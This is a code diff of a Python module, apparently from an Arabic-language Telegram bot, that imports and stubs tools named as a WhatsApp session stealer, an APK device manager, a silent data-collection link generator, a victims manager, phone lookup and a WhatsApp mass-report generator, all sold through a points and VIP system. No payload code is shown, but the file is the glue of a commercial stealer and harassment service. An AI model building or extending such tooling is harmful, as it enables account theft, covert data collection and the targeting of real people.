@@ -1,12 +1,10 @@
 # imports_manager.py
 # ============================================================
-# v13 — نظام النقاط + رسائل التأكيد + الإعدادات
+# v13 — الإعدادات + رسائل التأكيد + نظام النقاط
 # ============================================================
-
 import io
 import json
 from telebot.types import InlineKeyboardMarkup
-
 from logging_config import get_logger
 
 logger = get_logger("imports_manager")
@@ -50,6 +48,7 @@ try:
 except Exception as e:
     logger.error(f"wa_stealer: {e}")
     WA_ENABLED = False
+
     def init_whatsapp_stealer_routes(app, bot): pass
     wa_bp = None
     def get_wa_data(session_id): return {"storage": None, "idb": None, "chunks_count": 0}
@@ -75,6 +74,7 @@ try:
 except Exception as e:
     logger.error(f"apk_manager: {e}")
     APK_MANAGER_ENABLED = False
+
     def init_apk_routes(app, bot): pass
     apk_bp = None
     def build_apk_panel(device_id): return InlineKeyboardMarkup()
@@ -98,10 +98,41 @@ try:
 except Exception as e:
     logger.exception(f"silent_collector: {e}")
     SILENT_ENABLED = False
+
     def init_silent_collector_routes(app, bot): pass
     def generate_silent_link(*a, **kw): return None
     def get_silent_data(*a, **kw): return None
     def get_user_silent_sessions(*a, **kw): return []
+
+
+# ═══ ★★★ WhatsApp Report ★★★ ═══
+try:
+    from whatsapp_report_generator import (
+        generate_report,
+        create_report_session,
+        get_report_session,
+        log_report_sent,
+        get_user_report_history,
+        add_to_history,
+        normalize_number,
+        REPORT_TEMPLATES,
+        WA_REPORT_EMAILS,
+    )
+    WA_REPORT_ENABLED = True
+    logger.info("[+] whatsapp_report_generator imported")
+except Exception as e:
+    logger.error(f"whatsapp_report_generator: {e}")
+    WA_REPORT_ENABLED = False
+
+    def generate_report(*a, **kw): return {"error": "disabled"}
+    def create_report_session(*a, **kw): return None
+    def get_report_session(*a, **kw): return None
+    def log_report_sent(*a, **kw): return 0
+    def get_user_report_history(*a, **kw): return []
+    def add_to_history(*a, **kw): return None
+    def normalize_number(*a, **kw): return None
+    REPORT_TEMPLATES = {}
+    WA_REPORT_EMAILS = {}
 
 
 # ═══ Phone Search ═══
@@ -115,6 +146,7 @@ try:
 except Exception as e:
     logger.exception(f"phone_search: {e}")
     PHONE_SEARCH_ENABLED = False
+
     def search_phone(*a, **kw): return {'error': 'Phone search disabled'}
     def format_result_for_telegram(r): return "❌ Phone search disabled"
 
@@ -150,6 +182,7 @@ try:
 except Exception as e:
     logger.exception(f"victims_manager: {e}")
     VICTIMS_ENABLED = False
+
     def create_victim(*a, **kw): return None
     def get_victim(*a, **kw): return None
     def get_all_victims(*a, **kw): return []
@@ -187,11 +220,9 @@ try:
     )
     POINTS_SYSTEM_ENABLED = True
     logger.info("[+] points_system imported")
-
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 0
     AVAILABLE_TOOLS = list(TOOL_PRICES.keys())
-
 except Exception as e:
     logger.exception(f"points_system: {e}")
     POINTS_SYSTEM_ENABLED = False
@@ -202,9 +233,7 @@ except Exception as e:
     def can_use_tool(user_id, tool):
         return {"allowed": True, "reason": "bypass", "cost": 0, "balance": 0}
 
-    def consume_usage(user_id, tool):
-        return True
-
+    def consume_usage(user_id, tool): return True
     def build_main_menu_keyboard(user_id): return InlineKeyboardMarkup()
     def build_points_menu_keyboard(user_id): return InlineKeyboardMarkup()
     def build_points_menu_text(user_id): return "نظام النقاط معطّل"
@@ -216,7 +245,6 @@ except Exception as e:
     def build_settings_menu_text(user_id): return "الإعدادات"
     def build_tool_confirm_text(user_id, tool): return "تأكيد", True
     def build_tool_confirm_keyboard(tool, can_proceed=True): return InlineKeyboardMarkup()
-
     def is_admin(uid): return False
     def is_vip(uid): return False
     def get_all_users(): return []
@@ -231,7 +259,6 @@ except Exception as e:
     def get_referral_by_code(code): return None
     def get_user_referrals(uid, limit=50): return []
     def _points_admin_stats(): return ""
-
     ADMIN_IDS = []
     WELCOME_POINTS = 25
     REFERRAL_POINTS = 10
@@ -328,10 +355,14 @@ def build_admin_users_keyboard(users, page=0, per_page=10):
     for u in page_users:
         uid = u.get("user_id")
         name = (u.get("first_name") or u.get("username") or "Unknown")[:20]
-        if is_admin(uid): icon = "👑"
-        elif u.get("is_banned"): icon = "🚫"
-        elif u.get("is_vip"): icon = "💎"
-        else: icon = "👤"
+        if is_admin(uid):
+            icon = "👑"
+        elif u.get("is_banned"):
+            icon = "🚫"
+        elif u.get("is_vip"):
+            icon = "💎"
+        else:
+            icon = "👤"
         m.row(InlineKeyboardButton(f"{icon} {name} | {uid}", callback_data=f"admin_user_{uid}"))
 
     total_pages = max(1, (len(users) + per_page - 1) // per_page)
@@ -380,10 +411,15 @@ def build_user_info_text(uid, user):
 
     import html
     def _h(t): return html.escape(str(t)) if t else ""
-    if is_admin(uid): status = "👑 أدمن"
-    elif user.get("is_banned"): status = "🚫 محظور"
-    elif user.get("is_vip"): status = "💎 VIP"
-    else: status = "👤 مستخدم"
+
+    if is_admin(uid):
+        status = "👑 أدمن"
+    elif user.get("is_banned"):
+        status = "🚫 محظور"
+    elif user.get("is_vip"):
+        status = "💎 VIP"
+    else:
+        status = "👤 مستخدم"
 
     return (
         f"👤 <b>معلومات المستخدم</b>\n"
@@ -414,7 +450,8 @@ logger.info(
     f"PHONE_SEARCH={PHONE_SEARCH_ENABLED} | "
     f"SILENT={SILENT_ENABLED} | "
     f"WA={WA_ENABLED} | "
+    f"WA_REPORT={WA_REPORT_ENABLED} | "
     f"APK_MGR={APK_MANAGER_ENABLED} | "
     f"VICTIMS={VICTIMS_ENABLED} | "
     f"POINTS_SYSTEM={POINTS_SYSTEM_ENABLED}"
-                           )
+    )
